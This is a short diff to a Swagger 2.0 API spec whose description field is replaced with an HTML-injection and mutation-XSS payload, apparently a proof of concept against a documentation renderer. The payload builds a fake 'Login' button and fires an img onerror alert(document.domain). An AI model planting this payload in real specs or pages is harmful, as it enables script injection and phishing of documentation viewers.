@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <div>test</div>
+  description: <h1>HTML injection</h1><a href=http://localhost><br><input type=button value="Login"></a><br/><br/><h1>Cross Site Scripting (XSS)</h1><form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=javascript:alert(document.domain) src=1>"></form>
   version: production
 basePath: /JSSResource/
 produces:
